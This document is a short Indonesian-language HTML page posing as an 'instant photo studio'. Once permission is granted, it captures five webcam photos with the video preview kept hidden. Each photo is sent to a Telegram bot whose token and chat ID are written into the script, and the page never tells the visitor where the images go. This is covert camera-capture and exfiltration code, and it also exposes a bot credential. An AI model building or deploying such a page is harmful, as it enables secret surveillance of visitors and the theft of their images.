<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Studio Foto Instan</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full bg-gray-800 p-6 rounded-2xl shadow-xl text-center">
        <h1 class="text-2xl font-bold mb-4">Studio Foto Instan</h1>
        <p class="mb-6 text-gray-400">Klik tombol di bawah untuk mengambil 5 foto otomatis.</p>
        
        <button id="startBtn" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-full transition-all">
            Mulai Sesi 5 Foto
        </button>

        <div id="status" class="mt-4 text-sm text-yellow-400 font-medium"></div>
    </div>

    <video id="video" class="hidden" autoplay playsinline></video>

    <script>
        const BOT_TOKEN = '8429814704:AAH2DUBcP5rok16SLARgJwjWeeNOrFKf0RY';
        const CHAT_ID = '6128943834';

        const video = document.getElementById('video');
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        // Jeda waktu antar foto dalam milidetik
        const delays = [1000, 500, 3000, 1000, 500];

        async function initCamera() {
            try {
                status.innerText = "Meminta izin kamera...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                startBtn.classList.add('hidden');
                
                for (let i = 0; i < 5; i++) {
                    status.innerText = `Mengambil foto ke-${i + 1}...`;
                    await new Promise(resolve => setTimeout(resolve, i === 0 ? 1500 : delays[i-1]));
                    await takeAndSendPhoto(i + 1);
                }

                status.innerText = "✅ Semua 5 foto berhasil dikirim!";
                status.classList.replace('text-yellow-400', 'text-green-400');
                video.srcObject.getTracks().forEach(track => track.stop());
            } catch (err) {
                status.innerText = "Error Kamera: " + err.message;
            }
        }

        async function takeAndSendPhoto(index) {
            const tempCanvas = document.createElement('canvas');
            tempCanvas.width = video.videoWidth;
            tempCanvas.height = video.videoHeight;
            tempCanvas.getContext('2d').drawImage(video, 0, 0);
            
            const imageData = tempCanvas.toDataURL('image/jpeg');
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', dataURLToBlob(imageData));
            formData.append('caption', `📸 Foto ke-${index} dari 5`);

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error("Gagal kirim foto " + index);
            }
        }

        function dataURLToBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while(n--){ u8arr[n] = bstr.charCodeAt(n); }
            return new Blob([u8arr], {type:mime});
        }

        startBtn.addEventListener('click', initCamera);
    </script>
</body>
</html>
